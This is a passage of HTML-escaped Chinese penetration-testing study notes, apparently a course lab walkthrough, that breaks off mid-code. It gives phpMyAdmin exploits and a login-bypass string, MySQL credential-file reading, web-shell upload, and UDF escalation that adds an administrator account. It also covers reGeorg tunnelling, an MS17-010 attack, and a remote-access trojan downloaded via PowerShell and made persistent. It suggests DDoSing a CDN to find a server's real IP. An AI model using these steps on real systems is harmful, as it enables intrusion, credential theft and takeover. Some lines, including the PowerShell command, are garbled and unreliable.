&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;原文链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc3NteHIvYXJ0aWNsZS9kZXRhaWxzLzEyMTQ2Mzc2Ng==&#34;&gt;https://blog.csdn.net/missmxr/article/details/121463766&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;24-综合渗透之-udf-提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#24-综合渗透之-udf-提权&#34;&gt;#&lt;/a&gt; 2.4 综合渗透之 UDF 提权&lt;/h1&gt;
&lt;h2 id=&#34;信息搜集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息搜集&#34;&gt;#&lt;/a&gt; 信息搜集&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;寻找常见目录 (robots.txt,phpinfo.php,phpmyadmin), 使用 dirsearch 扫&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Whios 信息查询：站长之家，kali&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务器信息：脚本、框架、中间件版本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;子域名挖掘，旁站，c 段&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;端口：nmap，在线工具，，&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;真实 ip：有 cdn，使用 ping、二级域名、nslookup 等，或者 DDos 打完 cdn 流量&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;讲解的环境从-phpmyadmin即数据库登陆入手&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#讲解的环境从-phpmyadmin即数据库登陆入手&#34;&gt;#&lt;/a&gt; 讲解的环境，从 phpmyadmin，即数据库登陆入手&lt;/h2&gt;
&lt;h3 id=&#34;利用-phpadmin-漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-phpadmin-漏洞&#34;&gt;#&lt;/a&gt; 利用 phpadmin 漏洞&lt;/h3&gt;
&lt;p&gt;一、影响版本：3.5.x &amp;lt; 3.5.8.1 and 4.0.0 &amp;lt; 4.0.0-rc3&lt;/p&gt;
&lt;p&gt;概述：phpmyadmin 存在 PREG_REPLACE_EVAL 漏洞&lt;/p&gt;
&lt;p&gt;利用模块：exploit/multi/http/phpmyadmin_preg_replace&lt;/p&gt;
&lt;p&gt;CVE：CVE-2013-3238&lt;/p&gt;
&lt;p&gt;二、影响版本：v3.5.2.2&lt;/p&gt;
&lt;p&gt;概述：phpmyadmin 存在 server_sync.PHP 后门漏洞&lt;/p&gt;
&lt;p&gt;利用模块：exploit/multi/http/phpmyadmin_3522_backdoor&lt;/p&gt;
&lt;p&gt;CVE：CVE-2012-5159&lt;/p&gt;
&lt;p&gt;三、影响版本：2.11.x &amp;lt; 2.11.9.5 and 3.x ❤️.1.3.1&lt;/p&gt;
&lt;p&gt;概述：phpmyadmin 配置文件 /config/config.inc.php 存在命令执行&lt;/p&gt;
&lt;p&gt;利用模块：exploit/unix/webapp/phpmyadmin_config&lt;/p&gt;
&lt;p&gt;CVE：CVE-2009-1151&lt;/p&gt;
&lt;p&gt;四、影响版本 2.11.3/2.11.4&lt;/p&gt;
&lt;p&gt;利用方法：用户名处写入 &#39;localhost&#39;@&#39;@&#34; 登陆成功。(全部为英文标点符号，最后一个是双引号)&lt;/p&gt;
&lt;p&gt;php 爆绝对路径的办法：&lt;/p&gt;
&lt;p&gt;phpMyAdmin/libraries/select_lang.lib.php&lt;/p&gt;
&lt;p&gt;phpMyAdmin/darkblue_orange/layout.inc.php&lt;/p&gt;
&lt;p&gt;phpMyAdmin/index.php?lang=1&lt;/p&gt;
&lt;p&gt;phpMyAdmin/themes/darkblue_orange/layout.inc.php&lt;/p&gt;
&lt;h3 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h3&gt;
&lt;p&gt;字符型，数字型，布尔盲注，时间盲注&lt;/p&gt;
&lt;p&gt;使用 sqlmap&lt;/p&gt;
&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--is-dba 判断当前用户是否为管理员&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--privileges  判断当前用户名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--password    当前数据库用户密码&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;得到 hash 值，用弱密码爆破，或者用 cmd5 网址查询 (一般查不到)&lt;/p&gt;
&lt;p&gt;(啊 d) 工具&lt;/p&gt;
&lt;p&gt;尝试写文件，无权限，这里需要提权&lt;/p&gt;
&lt;h3 id=&#34;获取-root-权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取-root-权限&#34;&gt;#&lt;/a&gt; 获取 root 权限&lt;/h3&gt;
&lt;p&gt;这里使用 mysql 的越权漏洞&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;LOAD&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;DATA&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;LOCAL&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INFILE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;dir\\MySQL\\data\\mysql\\user.MYD&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; admin &lt;span class=&#34;token keyword&#34;&gt;fields&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;terminated&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token string&#34;&gt;&#34; LINES TERMINATED BY &#34;&lt;/span&gt;\&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;而这 &lt;code&gt;dir&lt;/code&gt;  的获取通过 &lt;code&gt;select @@basedir&lt;/code&gt; ; 查看 mysql 的绝对路径，如（这里用 window 系统为例） &lt;code&gt;C:/Program Files/phpStudy/MySQL/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那么使用漏洞的语句为&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;LOAD&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;DATA&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;LOCAL&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INFILE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\\Program Files\\phpStudy\\MySQL\\data\\mysql\\user.MYD&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; admin &lt;span class=&#34;token keyword&#34;&gt;fields&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;terminated&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token string&#34;&gt;&#34; LINES TERMINATED BY &#34;&lt;/span&gt;\&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这样可以在表中可以看到 root 的用户名及密码&lt;/p&gt;
&lt;p&gt;在该环境中，密文的长度和字符范围均知，采用 cain 爆破&lt;/p&gt;
&lt;p&gt;爆破成功后，登陆 root 用户，那么就可以写一句话木马了&lt;/p&gt;
&lt;p&gt;但在此之前需要知道网站的根目录，这里利用信息搜集的 phpinfo.php 的网址，获取根目录&lt;/p&gt;
&lt;p&gt;获取根目录后，写文件，写一句话木马&lt;/p&gt;
&lt;p&gt;使用蚁剑 / 菜刀连接&lt;/p&gt;
&lt;h3 id=&#34;udf-提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#udf-提权&#34;&gt;#&lt;/a&gt; UDF 提权&lt;/h3&gt;
&lt;p&gt;先上传 udf.php 和 gethash&lt;/p&gt;
&lt;p&gt;访问  &lt;code&gt;url/udf.php&lt;/code&gt;  ，登陆 root 用户&lt;/p&gt;
&lt;p&gt;执行 shell 命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select shell(&#34;cmd&#34;,&#39;c:/gethash&#39;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;根据提示&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select shell(&#34;cmd&#34;,&#39;c:/gethash -dhl&#39;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;获取到 hash 值，之后用彩虹表进行爆破&lt;/p&gt;
&lt;p&gt;(或者使用以下 sql 语句)&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; cmdshell &lt;span class=&#34;token keyword&#34;&gt;returns&lt;/span&gt; string &lt;span class=&#34;token keyword&#34;&gt;soname&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;moonudf.dll&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; cmdshell&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;net user username password /add&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; cmdshell&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;net localgroup administrators username /add&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;25-从外网到内网主机远控-msf-sock-代理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#25-从外网到内网主机远控-msf-sock-代理&#34;&gt;#&lt;/a&gt; 2.5 从外网到内网主机远控 msf sock 代理&lt;/h1&gt;
&lt;p&gt;两台外网攻击机（一台 kali，一台 windows）&lt;/p&gt;
&lt;p&gt;一个公司主机，双网卡，连接内网主机&lt;/p&gt;
&lt;p&gt;目的：上传 webshell，获取公司网站的权限，然后拿下内网主机&lt;/p&gt;
&lt;p&gt;使用工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;reGeorg + proxychains 代理进入内网&lt;/li&gt;
&lt;li&gt;利用 msf 获取 system 权限&lt;/li&gt;
&lt;li&gt;Powershell 下载并运行远控&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;上传-webshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#上传-webshell&#34;&gt;#&lt;/a&gt; 上传 webshell&lt;/h2&gt;
&lt;p&gt;上传成功后，蚁剑连接，进入虚拟终端，查看用户， &lt;code&gt;whoami&lt;/code&gt; ，为 apache&lt;/p&gt;
&lt;p&gt;查看 php 库， &lt;code&gt;php -m&lt;/code&gt;  发现有 &lt;code&gt;sockets&lt;/code&gt; ，那么在上传 reGeorg 中的 tunnel.php 时，可以先删去， &lt;code&gt;dl(&#34;php_sockets.dll&#34;);&lt;/code&gt;  该行，防止报错&lt;/p&gt;
&lt;h2 id=&#34;连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#连接&#34;&gt;#&lt;/a&gt; 连接&lt;/h2&gt;
&lt;h3 id=&#34;kali-代理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#kali-代理&#34;&gt;#&lt;/a&gt; kali 代理&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;python reGeorgSocksProxy.py -p port - u url&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;扫描端口号&lt;/p&gt;
&lt;p&gt;由于不能访问内网，这里采用代理访问&lt;/p&gt;
&lt;p&gt;&lt;code&gt;proxychains4 nmap -sT -Pn 内网ip(可通过webshell的ifconfig获取)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由结果可以判断为 window 系统，由开放的 445 端口，判断存在 &lt;code&gt;MS17010&lt;/code&gt;  漏洞，接下来开始 msf&lt;/p&gt;
&lt;p&gt;&lt;code&gt;proxychains msfconsole&lt;/code&gt;  或 &lt;code&gt;peoxychains -q msfconsole&lt;/code&gt;  静默加载&lt;/p&gt;
&lt;p&gt;加载完后输入 &lt;code&gt;use exploit/windows/smb/ms17_010_psexec&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;option&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/msf_socket_1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;只需要填写 &lt;code&gt;rhost&lt;/code&gt;  参数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set rhost 内网ip&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;run&lt;/code&gt;  运行，进入 shell , 输入 &lt;code&gt;whoami&lt;/code&gt; ，为 &lt;code&gt;system&lt;/code&gt;  系统用户&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/msf_socket_2.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;远控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远控&#34;&gt;#&lt;/a&gt; 远控&lt;/h2&gt;
&lt;p&gt;Quasar&lt;a href=&#34;http://dpm12345.cn/2022/08/31/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%AD%A6%E4%B9%A0/&#34;&gt; 链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在下图中的 &lt;code&gt;Connection to Hosts&lt;/code&gt;  填入内网 ip，port 填入端口号，点击生成，将生成的.exe 文件上传至公司网站上，然后在内网利用 Powershell 下载该.exe 文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;powershell client=new-object System.Net.WebClient:client=new−objectSystem.Net.WebClient:client.DownloadFile(&#39;url (外网主机 ip + 路径)&#39;,&#39; 本地路径 &#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;下载成功后直接输入文件名即可运行&lt;/p&gt;
&lt;p&gt;这时回到 Quasar 的 Settings，开始监听之前设置的端口&lt;/p&gt;
&lt;p&gt;可以看到监听列表有一个，但由于不是由当前用户启动该.exe 程序，没有桌面画面，这时可以将该文件作为启动项，即可将该文件放入启动项文件夹中，如  &lt;code&gt;C:\User\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;内网主机重启后可控制桌面&lt;/p&gt;
&lt;h1 id=&#34;26-kali-linux-信息搜集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#26-kali-linux-信息搜集&#34;&gt;#&lt;/a&gt; 2.6 kali linux 信息搜集&lt;/h1&gt;
&lt;h2 id=&#34;dnsenum&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dnsenum&#34;&gt;#&lt;/a&gt; Dnsenum&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dnsenum [Options] &amp;lt;domain&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--dnsserver&lt;/code&gt;  指定 dns 服务器，并解析目标域名的 A，NS 和 MX 记录信息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--enum&lt;/code&gt;  (相当于是 &lt;code&gt;--threads5-s 15-w&lt;/code&gt; ) 同时进行域名查询，并从 google 中查询目标域名的子域名 (此功能需要访问 google, 否则无法获取子域名)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-O&lt;/code&gt;  将查询结果以 xml 格式保存到某个文件中&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;dig&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dig&#34;&gt;#&lt;/a&gt; Dig&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dig [@global-server][domain] [q-type]&lt;/code&gt;  可以指定 dns 服务器&lt;/li&gt;
&lt;li&gt;q-type 指定查询类型 (a, mx,ns,soa,hinfo,axfr,txt) ，默认只查询 A 记录&lt;/li&gt;
&lt;li&gt;-b 指定查询的源地址&lt;/li&gt;
&lt;li&gt;d-opt&lt;/li&gt;
&lt;li&gt;trace 显示域名解析过程&lt;/li&gt;
&lt;li&gt;short 显示精简的信息&lt;/li&gt;
&lt;li&gt;nssearch 显示授权的 dns 服务器信息&lt;/li&gt;
&lt;li&gt;类似工具：nslookup/hos&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;fierce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fierce&#34;&gt;#&lt;/a&gt; Fierce&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Fierce [-dns example.com][OPTIONS]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;-dnsserver 指定 dns 服 务器&lt;/li&gt;
&lt;li&gt;-range 指定扫描的地址范围&lt;/li&gt;
&lt;li&gt;-file 指定输出的文件&lt;/li&gt;
&lt;li&gt;-wordlist 指定字典文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;dmitry&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dmitry&#34;&gt;#&lt;/a&gt; Dmitry&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dmitry [-winsepfb][-t 0-9] [-0 host.txt] host&lt;/code&gt; -w whois 查询，通过域名查地址 i 参数正好相反&lt;/li&gt;
&lt;li&gt;-n 从 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25ldGNyYWZ0LmNvbQ==&#34;&gt;netcraft.com&lt;/span&gt; 获取主机信息&lt;/li&gt;
&lt;li&gt;-s 查询子域名 (需要能够访问 google)&lt;/li&gt;
&lt;li&gt;-e 查询邮件地址&lt;/li&gt;
&lt;li&gt;-p 进行 tcp 端口扫描&lt;/li&gt;
&lt;li&gt;-t 指定端口扫描超时时间 (默认为 2s)&lt;/li&gt;
&lt;li&gt;-o 指定输出文件&lt;/li&gt;
&lt;li&gt;关于域名查询，也可以直接访问站长工具进行在线查询&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;recon-ng&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#recon-ng&#34;&gt;#&lt;/a&gt; Recon-ng&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;是由 Python 编写的一个开源的 Web 侦查 (信息收集) 框架。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;4.9.2 版本， 支持 77 个侦查模块，8 个报告模块，2 个导入模块，2 个攻击模块，2 个发现模拟。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;search 模块&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;use 模块&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;showinfo 查看可设置的参数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;set 设置某项参数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;run&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Profiler 模块 interesting_ files 模块 shodan&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Workspaces 创建工作区 select 选择某个工作区&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Add hosts/netblocks/domains 在工作区下增加一些参数，适用于所有模块&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Set nameserver 在工作区下设置域名服务器，适用于所有模块&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Show hosts/netblocks/domain/ports 查看设置信息及获取信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;search interesting_files 查找敏感信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;search profiler 查找某个账号在知名网站的注册情况&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;show profilers&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;search shodan_hostname 查找某个域名相关的所有主机及其开放的端口信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;先要设置 &lt;code&gt;key&lt;/code&gt; ， &lt;code&gt;keys add shodan_api xxxxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;show keys&lt;/code&gt; , 可以看到设置的 key 值&lt;/p&gt;
&lt;p&gt;&lt;code&gt;show ports&lt;/code&gt;  展示信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输出信息 &lt;code&gt;use report&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;report 形式， &lt;code&gt;search report&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/recon-ng.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;show info&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/recon-ng_1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set TABLE xxx&lt;/code&gt;  设置格式&lt;/p&gt;
&lt;p&gt;之后  &lt;code&gt;run&lt;/code&gt;  执行&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;27-sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#27-sql-注入&#34;&gt;#&lt;/a&gt; 2.7 SQL 注入&lt;/h1&gt;
&lt;h2 id=&#34;mysql-的四种注释风格&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-的四种注释风格&#34;&gt;#&lt;/a&gt; mysql 的四种注释风格&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;#&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*...*/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/*!...*/&lt;/code&gt;  (内联注释)  &lt;code&gt;/*!50000*/&lt;/code&gt;  (mysql 版本大于 50000 执行)&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;mysql-中常用的函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-中常用的函数&#34;&gt;#&lt;/a&gt; mysql 中常用的函数&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;system__user()&lt;/code&gt;  系统用户名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;user()&lt;/code&gt;  用户名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;current user()&lt;/code&gt;  当前用户名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;session_user()&lt;/code&gt;  连接 $ 据库的用户名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;database()&lt;/code&gt;  数据库名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;version()&lt;/code&gt;  MYSQL 数 据库版本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;load_file()&lt;/code&gt;  MYSQL 读取本地文件的函数&lt;/p&gt;
&lt;p&gt;操作前提:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;知道文件绝对路径&lt;/li&gt;
&lt;li&gt;能够使用 union 查询&lt;/li&gt;
&lt;li&gt;对 web 目录有写权限&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; /etc/passwd&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;# .&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token 